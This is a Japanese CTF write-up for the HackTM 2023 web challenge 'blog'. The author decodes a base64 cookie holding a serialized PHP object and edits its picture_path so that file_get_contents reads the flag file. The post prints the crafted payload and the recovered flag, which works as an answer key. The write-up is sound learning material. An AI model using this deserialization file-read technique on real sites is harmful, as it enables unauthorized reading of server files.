---
title: "HackTM ctf 2023"
date: 2023-02-19T21:54:58+09:00
tags: ["ctf"]
draft: false
---
# HackTM ctf writeup

2023/02/19(日)は`HackTM CTF`に参加していました。

結果は、

![image](https://user-images.githubusercontent.com/93389879/219948685-f6beff8b-d70e-4b71-9d23-0fde00e24e5d.png)

このような感じでした。

Webをもっと解けるようにしたい。

今回は、Miscは調べるだけだったので特に何も書きません。

## web

### blog

アクセスするとまずログイン画面が出てきます。

![image](https://user-images.githubusercontent.com/93389879/219947792-736d7a2b-8efe-4e4b-901c-c058a728d8c4.png)

ひとまず、`se0r12`, `test`でアカウントを作って進みます。

アカウントを作成すると、`Cookie`が、

```text
Cookie: user=Tzo0OiJVc2VyIjoyOntzOjc6InByb2ZpbGUiO086NzoiUHJvZmlsZSI6Mjp7czo4OiJ1c2VybmFtZSI7czo2OiJzZTByMTIiO3M6MTI6InBpY3R1cmVfcGF0aCI7czoyNzoiaW1hZ2VzL3JlYWxfcHJvZ3JhbW1lcnMucG5nIjt9czo1OiJwb3N0cyI7YTowOnt9fQ%3D%3D
```

このようになっていて、これをイジイジすると

```text
O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:6:"se0r12";s:12:"picture_path";s:27:"images/real_programmers.png";}s:5:"posts";a:0:{}}
```

このようになっていました。

次にソースコードを眺めてみます。

`until.php`

```php
    public function __toString() {
        if (gettype($this->picture_path) !== "string") {
            return "";
        }

        $picture = base64_encode(file_get_contents($this->picture_path));

        // check if user exists
        $conn = new Conn;
        $conn->queries = array(new Query(
            "select id from users where username = :username",
            array(":username" => $this->username)
        ));
        $result = $conn();
        if ($result[0] === false || $result[0]->fetchArray() === false) {
            return "<script>window.location = '/login.php'</script>";
        } else {
            return "
            <div class='card'>
                <img class='card-img-top profile-pic' src='data:image/png;base64,{$picture}'>
                <div class='card-body'>
                    <h3 class='card-title'>{$this->username}</h3>
                </div>
            </div>
            ";
        }
    }
```

```php
$picture = base64_encode(file_get_contents($this->picture_path));
```

この部分に目をつけpicture_pathを改ざんすれば、フラグがゲットできそうだなと考えました。

```
O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:6:"se0r12";s:12:"picture_path";s:46:"/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt";}s:5:"posts";a:0:{}}
```

として直してリクエストを投げると、

```
data:image/png;base64,SGFja1RNe3IzdF9fdG9TdHJpbmdfMXNfczBfZnVuXzEzYzU3M2Y2fQo=
```

画像部分がこのようになりました。

これをbase64 decodeしてあげると

```bash
$ echo SGFja1RNe3IzdF9fdG9TdHJpbmdfMXNfczBfZnVuXzEzYzU3M2Y2fQo=| base64 -d
HackTM{r3t__toString_1s_s0_fun_13c573f6}
```

```
HackTM{r3t__toString_1s_s0_fun_13c573f6}
```

